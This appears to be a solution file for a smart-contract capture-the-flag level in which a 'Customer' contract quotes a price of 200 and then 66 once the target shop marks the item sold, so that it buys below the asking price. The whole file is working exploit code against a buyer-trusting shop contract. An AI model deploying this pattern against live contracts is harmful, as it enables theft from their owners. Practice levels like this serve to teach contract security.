pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external returns (bool);
}

contract Customer {

    function price() public returns(uint) {
        return IShop(msg.sender).isSold()? 66:200;
    }

    function hack(address _shop) public {
        IShop(_shop).buy();
    }
}